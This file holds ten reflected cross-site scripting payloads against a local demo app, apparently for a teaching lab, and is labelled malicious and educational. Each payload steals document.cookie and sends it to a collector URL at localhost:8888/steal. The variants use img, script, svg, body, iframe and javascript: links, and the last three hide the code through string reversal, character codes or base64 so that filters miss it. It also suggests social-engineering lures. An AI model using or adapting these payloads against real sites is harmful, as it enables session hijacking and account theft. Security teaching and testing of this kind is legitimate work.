// WARNING: These are MALICIOUS scripts for educational purposes only!


// ============================================================
// PAYLOAD #1: Simple Image Tag XSS
// ============================================================
// Social engineering: "Check out this cool feature!"
// URL parameter contains <img> tag with onerror that steals cookie

http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">


// ============================================================
// PAYLOAD #2: Script Tag Injection
// ============================================================
// Social engineering: "Click this link to verify your account"
// Direct <script> injection in URL parameter

http://localhost:5009/protected?search=<script>new Image().src='http://localhost:8888/steal?cookie='+document.cookie</script>


// ============================================================
// PAYLOAD #3: URL Encoded Payload
// ============================================================
// More sophisticated - URL encoded to bypass basic filters
// %3C = <, %3E = >, %27 = ', %2B = +

http://localhost:5009/protected?search=%3Cscript%3Efetch('http://localhost:8888/steal?cookie='%2Bdocument.cookie)%3C/script%3E


// ============================================================
// PAYLOAD #4: SVG XSS
// ============================================================
// Using SVG tag with onload event
// Often bypasses filters that only check for <script>

http://localhost:5009/protected?search=<svg/onload="new Image().src='http://localhost:8888/steal?cookie='+document.cookie">


// ============================================================
// PAYLOAD #5: JavaScript Protocol
// ============================================================
// Using javascript: protocol in href
// Works if application reflects URL in <a> tag

http://localhost:5009/protected?search=<a href="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">Click here</a>


// ============================================================
// PAYLOAD #6: Body Tag with onload
// ============================================================
// Injects body tag with onload event

http://localhost:5009/protected?search=<body onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)">


// ============================================================
// PAYLOAD #7: Iframe Injection
// ============================================================
// Creates hidden iframe that loads attacker's page

http://localhost:5009/protected?search=<iframe src="http://localhost:8888/steal?cookie="+document.cookie style="display:none"></iframe>


// ============================================================
// PAYLOAD #8: String Reversal Trick
// ============================================================
// String odwrócony i odwracany z powrotem - ekstremalnie ukryty

http://localhost:5009/protected?search=<img src=x onerror="eval('eikooc.tnemucod+\'=c?laets/8888:tsohlacol//:ptth\'=crs.)egamI wen'.split('').reverse().join(''))">


// ============================================================
// PAYLOAD #9: CharCode Encoding
// ============================================================
// Buduje string z kodów znaków - bardzo trudny do odczytania

http://localhost:5009/protected?search=<img src=x onerror="eval(String.fromCharCode(110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,39,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,56,56,56,56,47,115,116,101,97,108,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))">

// ============================================================
// PAYLOAD #10: Multiple Encoding Layers
// ============================================================
// Podwójne kodowanie - Base64 + URL encode
// Ekstremalnie trudne do wykrycia

http://localhost:5009/protected?search=%3Cimg%20src%3Dx%20onerror%3D%22eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vbG9jYWxob3N0Ojg4ODgvc3RlYWw/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='))%22%3E